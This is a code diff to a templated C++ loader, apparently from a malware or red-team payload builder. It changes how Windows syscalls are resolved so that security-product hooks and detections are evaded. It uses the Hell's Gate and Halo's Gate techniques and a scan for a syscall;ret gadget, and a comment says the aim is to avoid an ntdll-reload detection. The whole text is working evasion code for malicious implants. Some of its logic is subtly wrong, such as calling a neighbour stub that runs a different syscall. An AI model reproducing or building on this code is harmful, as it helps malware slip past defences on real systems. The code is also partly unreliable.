@@ -121,63 +121,90 @@ static bool hellsgate_resolve(HMODULE ntdll) {
 {{#ENDIF}}
 
 {{#IF SYSCALL_INDIRECT}}
-// Indirect syscalls: read fresh ntdll from disk, parse exports
-static HMODULE g_clean_ntdll = nullptr;
+// Indirect syscalls: resolve SSNs from in-memory ntdll (Hell's Gate pattern),
+// find a clean syscall;ret gadget for indirect execution.
+// No second ntdll load — avoids "NTDLL loaded for a second time" detection.
+static void* g_syscall_gadget = nullptr;
 
 static bool indirect_resolve() {
-    // Map clean ntdll from disk
-    char ntdll_path[MAX_PATH];
-    char buf_sys[64];
-    // obf() version:
-    auto* sys32 = obf("C:\\Windows\\System32\\ntdll.dll");
-    lstrcpyA(ntdll_path, sys32);
+    HMODULE ntdll = get_ntdll();
+    if (!ntdll) return false;
 
-    HANDLE hFile = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ,
-                               NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return false;
-
-    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
-    if (!hMap) { CloseHandle(hFile); return false; }
-
-    g_clean_ntdll = reinterpret_cast<HMODULE>(
-        MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0));
-    CloseHandle(hMap);
-    CloseHandle(hFile);
-
-    if (!g_clean_ntdll) return false;
-
-    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(g_clean_ntdll);
+    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(ntdll);
     auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
-        reinterpret_cast<BYTE*>(g_clean_ntdll) + dos->e_lfanew);
+        reinterpret_cast<BYTE*>(ntdll) + dos->e_lfanew);
     auto exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
-        reinterpret_cast<BYTE*>(g_clean_ntdll) +
+        reinterpret_cast<BYTE*>(ntdll) +
         nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
     auto names = reinterpret_cast<DWORD*>(
-        reinterpret_cast<BYTE*>(g_clean_ntdll) + exports->AddressOfNames);
+        reinterpret_cast<BYTE*>(ntdll) + exports->AddressOfNames);
     auto funcs = reinterpret_cast<DWORD*>(
-        reinterpret_cast<BYTE*>(g_clean_ntdll) + exports->AddressOfFunctions);
+        reinterpret_cast<BYTE*>(ntdll) + exports->AddressOfFunctions);
     auto ords = reinterpret_cast<WORD*>(
-        reinterpret_cast<BYTE*>(g_clean_ntdll) + exports->AddressOfNameOrdinals);
+        reinterpret_cast<BYTE*>(ntdll) + exports->AddressOfNameOrdinals);
 
     for (DWORD i = 0; i < exports->NumberOfNames && g_syscall_count < 512; i++) {
         auto name = reinterpret_cast<const char*>(
-            reinterpret_cast<BYTE*>(g_clean_ntdll) + names[i]);
+            reinterpret_cast<BYTE*>(ntdll) + names[i]);
         if (name[0] != 'N' || name[1] != 't') continue;
 
-        auto addr = reinterpret_cast<BYTE*>(g_clean_ntdll) + funcs[ords[i]];
+        auto addr = reinterpret_cast<BYTE*>(ntdll) + funcs[ords[i]];
+
+        // Unhooked stub: mov r10,rcx (4C 8B D1) ; mov eax,SSN (B8 XX XX 00 00)
         if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 &&
             addr[3] == 0xB8) {
             uint16_t ssn = *reinterpret_cast<uint16_t*>(addr + 4);
             auto& entry = g_syscall_table[g_syscall_count++];
             entry.hash = djb2_hashA(name);
             entry.ssn = ssn;
-            // For indirect: call through the clean stub's full preamble
-            // (mov r10,rcx; mov eax,SSN; syscall; ret)
             entry.stub_addr = addr;
         }
+        // Hooked stub: search neighbors (Halo's Gate)
+        else if (addr[0] == 0xE9 || addr[0] == 0xFF) {
+            for (int j = 1; j < 32; j++) {
+                BYTE* neighbor = addr + (j * 32);
+                if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 &&
+                    neighbor[3] == 0xB8) {
+                    uint16_t neighbor_ssn = *reinterpret_cast<uint16_t*>(neighbor + 4);
+                    auto& entry = g_syscall_table[g_syscall_count++];
+                    entry.hash = djb2_hashA(name);
+                    entry.ssn = neighbor_ssn - static_cast<uint16_t>(j);
+                    entry.stub_addr = neighbor;
+                    break;
+                }
+                neighbor = addr - (j * 32);
+                if (neighbor > reinterpret_cast<BYTE*>(ntdll) &&
+                    neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 &&
+                    neighbor[3] == 0xB8) {
+                    uint16_t neighbor_ssn = *reinterpret_cast<uint16_t*>(neighbor + 4);
+                    auto& entry = g_syscall_table[g_syscall_count++];
+                    entry.hash = djb2_hashA(name);
+                    entry.ssn = neighbor_ssn + static_cast<uint16_t>(j);
+                    entry.stub_addr = neighbor;
+                    break;
+                }
+            }
+        }
     }
-    return g_syscall_count > 0;
+
+    // Find a clean syscall;ret gadget (0x0F 0x05 0xC3) in ntdll .text
+    auto section = IMAGE_FIRST_SECTION(nt);
+    for (WORD s = 0; s < nt->FileHeader.NumberOfSections; s++) {
+        if (section[s].Name[0] == '.' && section[s].Name[1] == 't') {
+            BYTE* text = reinterpret_cast<BYTE*>(ntdll) + section[s].VirtualAddress;
+            DWORD text_size = section[s].Misc.VirtualSize;
+            for (DWORD off = 0; off + 2 < text_size; off++) {
+                if (text[off] == 0x0F && text[off + 1] == 0x05 && text[off + 2] == 0xC3) {
+                    g_syscall_gadget = text + off;
+                    break;
+                }
+            }
+            break;
+        }
+    }
+
+    return g_syscall_count > 0 && g_syscall_gadget != nullptr;
 }
 {{#ENDIF}}
 
@@ -262,9 +289,22 @@ using NtQueueApcThread_t        = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, 
 using NtDelayExecution_t        = NTSTATUS(NTAPI*)(BOOLEAN, PLARGE_INTEGER);
 using NtClose_t                 = NTSTATUS(NTAPI*)(HANDLE);
 
-// Resolve and call via stub address (indirect syscalls)
+{{#IF SYSCALL_INDIRECT}}
+// Indirect syscall: call through the clean ntdll stub address.
+// For unhooked stubs we jump to the full preamble (mov r10,rcx; mov eax,SSN;
+// syscall; ret). For hooked stubs where we resolved SSN via neighbors,
+// stub_addr points to a clean neighbor — still valid.
 template<typename FnType>
 static FnType get_syscall_fn(uint32_t hash) {
     void* addr = get_stub_addr(hash);
     return reinterpret_cast<FnType>(addr);
 }
+{{#ENDIF}}
+
+{{#IF SYSCALL_HELLSGATE}}
+template<typename FnType>
+static FnType get_syscall_fn(uint32_t hash) {
+    void* addr = get_stub_addr(hash);
+    return reinterpret_cast<FnType>(addr);
+}
+{{#ENDIF}}
